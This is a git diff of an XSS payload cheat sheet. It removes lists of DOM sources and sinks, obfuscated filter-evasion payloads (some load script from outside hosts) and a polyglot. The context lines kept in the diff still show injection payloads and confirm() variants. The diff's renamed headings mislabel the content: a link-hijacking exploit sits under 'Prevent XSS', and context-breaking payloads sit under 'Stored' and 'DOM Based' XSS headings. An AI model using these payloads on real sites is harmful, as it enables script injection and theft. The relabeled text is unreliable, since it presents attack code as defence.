@@ -41,127 +41,10 @@
 - [BeEF](https://github.com/beefproject/beef)
 - [JShell](https://github.com/UltimateHackers/JShell)
 
-### Awesome XSS Mind Maps
-A beautiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
 
-### Awesome DOM XSS
+### Types of Attacks
 
-- Does your input go into a sink? `Vulnerable`
-- It doesn't? `Not vulnerable`
-
-**Source**: An input that could be controlled by an external (untrusted) source.
-
-```
-document.URL
-document.documentURI
-document.URLUnencoded (IE 5.5 or later Only)
-document.baseURI
-location
-location.href
-location.search
-location.hash
-location.pathname
-document.cookie
-document.referrer
-window.name
-history.pushState()
-history.replaceState()
-localStorage
-sessionStorage
-```
-
-**Sink**: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.
-
-```
-eval
-Function
-setTimeout
-setInterval
-setImmediate
-execScript
-crypto.generateCRMFRequest
-ScriptElement.src
-ScriptElement.text
-ScriptElement.textContent
-ScriptElement.innerText
-anyTag.onEventName
-document.write
-document.writeln
-anyElement.innerHTML
-Range.createContextualFragment
-window.location
-document.location
-```
-
-This comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).
-
-### Awesome Payloads
-```
-<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
-<d3"<"/onclick="1>[confirm``]"<">z
-<d3/onmouseenter=[2].find(confirm)>z
-<details open ontoggle=confirm()>
-<script y="><">/*<script* */prompt()</script
-<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
-<a href="javascript%26colon;alert(1)">click
-<a href=javas&#99;ript:alert(1)>click
-<script/"<a"/src=data:=".<a,[8].some(confirm)>
-<svg/x=">"/onload=confirm()//
-<--`<img/src=` onerror=confirm``> --!>
-<svg%0Aonload=%09((pro\u006dpt))()//
-<sCript x>(((confirm)))``</scRipt x>
-<svg </onload ="1> (_=prompt,_(1)) "">
-<!--><script src=//14.rs>
-<embed src=//14.rs>
-<script x=">" src=//15.rs></script>
-<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
-<iframe/src \/\/onload = prompt(1)
-<x oncut=alert()>x
-<svg onload=write()>
-```
-
-### Awesome Polyglots
-
-Here's an XSS polyglot that I made which can break out of 20+ contexts:
-```
-%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
-```
-
-Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)
-
-### Awesome Tags & Event Handlers
-- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
-- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
-
-Some less detected event handlers
-```
-ontoggle
-onauxclick
-ondblclick
-oncontextmenu
-onmouseleave
-ontouchcancel
-```
-
-Some HTML Tags that you will be using
-```
-img
-svg
-body
-html
-embed
-script
-object
-details
-isindex
-iframe
-audio
-video
-```
-
-### Awesome Context Breaking
-
-#### HTML Context
+#### Reflected XSS
 Case: `<tag>You searched for $input. </tag>`
 
 ```
@@ -169,7 +52,7 @@ Case: `<tag>You searched for $input. </tag>`
 </tag><svg onload=alert()>
 ```
 
-#### Attribute Context
+#### Stored XSS
 
 Case: `<tag attribute="$input">`
 
@@ -180,8 +63,7 @@ Case: `<tag attribute="$input">`
 "onmouseover=alert()//
 "autofocus/onfocus="alert()
 ```
-#### JavaScript Context
-
+#### DOM Based XSS
 Case: `<script> var new something = '$input'; </script>`
 
 ```
@@ -192,7 +74,7 @@ Case: `<script> var new something = '$input'; </script>`
 </script><svg onload=alert()>
 ```
 
-### Awesome Confirm Variants
+### Attack Testing
 Yep, confirm because alert is too mainstream.
 ```
 confirm()
@@ -211,7 +93,7 @@ new class extends confirm``{}
 [8].findIndex(confirm)
 ```
 
-### Awesome Exploits
+### Prevent XSS
 ##### Replace all links
 ```javascript
 Array.from(document.getElementsByTagName("a")).forEach(function(i) {
@@ -224,7 +106,7 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 ```
 A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
-### Awesome Probing
+###  In conclusion
 If nothing of this works, take a look at **Awesome Bypassing** section
 
 First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
